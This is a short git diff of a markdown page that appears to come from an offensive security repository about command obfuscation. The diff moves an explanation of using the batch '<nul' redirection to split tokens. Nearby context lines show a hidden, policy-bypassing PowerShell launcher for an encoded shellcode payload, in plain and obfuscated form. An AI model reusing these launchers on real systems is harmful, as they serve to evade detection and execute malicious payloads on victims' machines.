@@ -97,17 +97,16 @@ https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/p
 
 ---
 
-      Using a batch redirection caret (<nul) to 'escape' tokens.
-      'If you place a token at the caret the token is removed'.
-
-**example:** `cmd.exe <nul /c start <nul calc` == `cmd.exe /c start calc`
-![batch obfuscation](http://i.cubeupload.com/cu5bpj.jpg)
-
 - String command to obfuscate<br />
 `cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`
 
 - Using batch redirection (**<nul**) special character to obfuscate sourcecode.<br />
 `cmd.exe /c <nul powershell.exe <nul -nop -wind hidden -Exec Bypass -noni -enc $shellcode`
+
+      Using a batch redirection caret (<nul) to 'escape' tokens.
+      'If you place a token at the caret the token is removed'.
+       example: cmd.exe <nul /c start <nul calc == cmd.exe /c start calc
+![batch obfuscation](http://i.cubeupload.com/cu5bpj.jpg)
 
 ---
 
